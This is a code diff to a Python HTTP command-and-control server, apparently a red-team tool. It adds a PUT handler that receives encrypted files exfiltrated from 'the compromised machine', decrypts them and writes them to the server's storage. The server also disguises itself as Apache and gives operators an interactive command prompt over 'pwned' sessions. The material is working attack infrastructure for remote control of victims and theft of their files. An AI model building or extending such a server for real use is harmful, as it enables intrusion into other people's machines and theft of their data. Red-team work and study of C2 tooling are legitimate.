@@ -10,12 +10,12 @@ from inputimeout import inputimeout, TimeoutOccurred
 from encryption import cipher
 # Settings Variables(Constants) Importing
 from settings import (CMD_REQUEST, CWD_RESPONSE, FILE_REQUEST, RESPONSE, RESPONSE_KEY, INPUT_TIMEOUT, KEEP_ALIVE_CMD,
-                      BIND_ADDR, PORT)
+                      BIND_ADDR, PORT, FILE_SEND, STORAGE)
 
 
 def get_new_session():
     """Function to check if other sessions exist if none do Re-Initialize variables.
-	However, if sessions do exist, Allow the Red Team operator to pick one to become a new active session"""
+    However, if sessions do exist, Allow the Red Team operator to pick one to become a new active session"""
 
     # this variable must be global, as they will often be updated via multiple session
     global activeSession, pwnedDict, pwnedId
@@ -53,8 +53,8 @@ def get_new_session():
 
 class C2Handler(BaseHTTPRequestHandler):
     """This class is a child of the BaseHTTPRequestHandler class.
-	It handles all http requests arrived from the client
-	"""
+    It handles all http requests arrived from the client
+    """
  
     #Make our Server look like an Up-to-date Apache2 Server on CentOS
     server_version = "Apache/4.6.2"
@@ -103,7 +103,7 @@ class C2Handler(BaseHTTPRequestHandler):
                 if INPUT_TIMEOUT:
                     try:
                         # Azure kill a waiting HTTP GET Session after 4 minutes(230 seconds in Windows & 240 in Linux)
-					    # so we must handle input with a timeout as below
+                        # so we must handle input with a timeout as below
                         command = inputimeout(f"({clientIp}){clientAccount}@{clientHostname}:{cwd} => ",
                                               timeout=INPUT_TIMEOUT)
                     # if a timeout Occurs on our input, do a simple command to trigger a new session
@@ -164,6 +164,11 @@ class C2Handler(BaseHTTPRequestHandler):
                 print(f"{filepath} was not found on C2 Server.")
                 self.http_response(404)
 
+        else:
+            """NO body should ever post to our C2 Server other than the above paths; so 
+            this code block for security and avoiding posting from attackers"""
+            print(Fore.LIGHTRED_EX+f"⛔ {self.client_address[0]} just Accessed {self.path} on our C2 Server 🔐. "
+                                   f"Why?\n Asking from yourself 🙃 \n")
 
     def do_POST(self):
         """this method handles all http POST Requests arrived at the C2 server."""
@@ -184,6 +189,41 @@ class C2Handler(BaseHTTPRequestHandler):
         this code block for security and avoiding posting from attackers"""
             print(Fore.LIGHTRED_EX+f"⛔ {self.client_address[0]} just Accessed {self.path} on our C2 Server 🔐. "
                                    f"Why?\n Asking from yourself 🙃 \n")
+
+    def do_PUT(self):
+        """this method handle all HTTP PUT Requests arrived to C2 Server"""
+        #Follow this code block when the compromised machine is sending the file to the server
+        if self.path.startswith(FILE_SEND + "/"):
+            self.http_response(200)
+
+            # Split out the encrypted filename from http put requests
+            filename = self.path.split(FILE_SEND + "/")[1]
+            # Test print
+            print("filename Before decryption: ", filename)
+
+            # Encode the file because decryption requires it, then decrypt and then decode
+            filename = cipher.decrypt(filename.encode()).decode()
+            # test print
+            print("filename After decryption: ", filename)\
+
+            # Add filename to our storage path
+            incomingFile = STORAGE + "/" + filename
+            # Test print
+            print("incomingFile: ", incomingFile)
+
+            # We need Content Length to properly read in the file
+            fileLength = int(self.headers["Content-Length"])
+
+            # Read the Stream coming from our connected client, then decrypt it and write the file to disk on C2 server
+            with open(incomingFile, 'wb') as fileHandle:
+                uploadData = cipher.decrypt(self.rfile.read(fileLength))
+                fileHandle.write(uploadData)
+
+        # Nobody should ever get here using an HTTP Put method
+        else:
+            print(Fore.LIGHTRED_EX+f"⛔ {self.client_address[0]} just Accessed {self.path} on our C2 Server 🔐. "
+                                   f"Why?\n Asking from yourself 🙃 \n")
+
 
     def handle_post_data(self):
         """ this function handles all http POST Requests arrived at the C2 client."""
@@ -214,7 +254,7 @@ class C2Handler(BaseHTTPRequestHandler):
 
     def http_response(self, code: int):
         """this function sends the HTTP Response codes
-		and Headers back to the client"""
+        and Headers back to the client"""
         self.send_response(code)
         self.end_headers()
     
